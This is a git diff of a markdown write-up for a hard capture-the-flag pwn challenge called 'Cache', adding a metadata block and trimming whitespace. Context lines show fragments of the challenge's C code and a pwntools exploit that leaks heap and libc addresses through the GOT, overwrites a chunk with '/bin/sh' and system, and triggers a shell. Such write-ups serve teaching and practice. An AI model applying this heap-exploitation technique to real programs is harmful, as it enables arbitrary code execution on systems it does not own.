@@ -1,4 +1,13 @@
-# Cache
+# cache
+
+```
+author: T3jv1l
+score: 50
+solved: 78/79
+difficulty: hard
+tags: pwn
+```
+
 Can you catch me?
 
 Attach:\
@@ -17,10 +26,10 @@ MENU
 6: Delete admin
 7: Delete user
 
-Choice: 
+Choice:
 ```
 1. Make new admin:\
-Create a heap chunk have 0x20 bytes as size. 
+Create a heap chunk have 0x20 bytes as size.
 ```c
 ADMIN_DATA = (code **)malloc(0x10);
 ADMIN_DATA[1] = admin_info;
@@ -132,12 +141,12 @@ def main():
     res = info_user(r)[:-1]
     res = res.ljust(8,b"\x00")
     res = u64(res)
-    
+
     admin_chunk = res
     user_chunk = admin_chunk + 0x20
 
     log.info("Chunk: " + str(hex(admin_chunk)))
-    
+
     log.info("LEAK DONE")
 
     # malloc user_chunk -> GOT:
@@ -152,15 +161,15 @@ def main():
     res = info_user(r)[8:-1]
     res = res.ljust(8,b"\x00")
     res = u64(res)
-    base_libc = res - libc.symbols["free"] 
+    base_libc = res - libc.symbols["free"]
     libc.address = base_libc
     system = libc.symbols["system"]
     log.info("System libc: " + str(hex(system)))
-     
+
     # Edit for creating system("/bin/sh")
     log.info("Edit user_chunk with: | \"/bin/sh\" | system |")
     edit_user(r, b"/bin/sh\x00"+p64(system))
-    
+
     # Trigger shell
     del_user(r)
 
